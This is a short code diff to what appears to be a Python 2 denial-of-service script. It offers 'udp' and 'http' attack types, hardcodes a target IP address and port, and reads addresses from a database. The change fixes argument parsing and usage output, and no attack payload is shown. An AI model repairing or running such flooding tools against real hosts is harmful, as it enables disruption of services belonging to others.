@@ -10,15 +10,17 @@ TARGET = "108.179.184.95"
 TARGET_PORT = 7
 
 if len(sys.argv) < 4:
+    print
     print "USAGE: {attack type} {target address} {timeout (seconds)} {# threads} {port}"
     print "Attack types: 'udp', 'http'"
+    print
     sys.exit(0)
 
 attack = sys.argv[1].lower()
 target = sys.argv[2]
 timeout = sys.argv[3]
 threads = sys.argv[4]
-port = len(sys.argv) > 5 ? sys.argv[5] : 7
+port = sys.argv[5] if len(sys.argv) > 5 else 7
 
 con = lite.connect('addresses.db')
 with con:    
